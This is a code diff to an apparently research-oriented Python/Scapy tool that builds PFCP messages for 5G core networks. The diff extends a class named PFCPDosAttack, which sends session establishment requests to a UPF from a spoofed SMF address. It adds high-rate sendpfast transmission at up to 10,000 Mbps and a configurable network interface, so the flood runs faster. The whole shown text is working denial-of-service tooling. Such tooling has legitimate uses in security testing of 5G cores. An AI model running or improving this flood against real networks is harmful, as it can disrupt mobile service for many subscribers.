@@ -1,4 +1,4 @@
-from scapy.all import send, sr1, IP, UDP, conf
+from scapy.all import send, sendpfast, sr1, IP, UDP, conf
 from scapy.contrib.pfcp import *
 import time, random, ipaddress, threading
 
@@ -12,6 +12,7 @@ UPF_ADDR  = "10.100.200.2"
 SPOOFED_SMF_ADDR = "10.100.200.8"
 DEST_PORT = 8805
 SRC_PORT = 8805
+NET_IFACE= "eth0"
 seq=1
 
 class TColors:
@@ -426,7 +427,7 @@ class Ez_PFCP:
             
             
     def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
-                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
+                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0, net_interface="eth0", use_sendpfast=False):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -463,8 +464,12 @@ class Ez_PFCP:
             interface=interface,
             random_seq=random_seq,
             random_far_number=random_far_number
+            
         )
-        send(pfcp_session_establishment_req)
+        if use_sendpfast:
+            sendpfast(pfcp_session_establishment_req, iface=net_interface, mbps=10000)
+        else:
+            send(pfcp_session_establishment_req)
         if self.verbose:
             self.logger.success(f"PFCP Session Establishment packet sent to {dest_addr} with SEID {seid}")
             
@@ -536,7 +541,7 @@ class Ez_PFCP:
 
 
 class PFCPDosAttack:
-    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15, smf_addr=None):
+    def __init__(self, evil_addr, upf_addr, src_port, dest_port, interface="eth0", ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15, smf_addr=None):
         self.evil_addr = evil_addr
         self.upf_addr = upf_addr
         self.src_port = src_port
@@ -565,8 +570,14 @@ class PFCPDosAttack:
         self.evil_addr, self.upf_addr, self.src_port, self.dest_port
         self.paramsHandler = HandleParams(self.classPrefix)
         
+        self.interface = interface
         
         
+    def set_interface(self, interface):
+        self.interface = interface
+        if not self.verbose : return
+        if interface:
+            self.logger.info(f"Interface set to {interface}")
         
     
 
@@ -713,7 +724,9 @@ class PFCPDosAttack:
                         ue_addr=self.new_ue_addr(),
                         teid=self.new_teid(),
                         random_seq=self.randomize,
-                        random_far_number=self.random_far_number
+                        random_far_number=self.random_far_number,
+                        net_interface=self.interface,
+                        use_sendpfast=True
                     )
                 except Exception as e:
                     worker_logger.error(f"Error sending PFCP session establishment request: {e}")
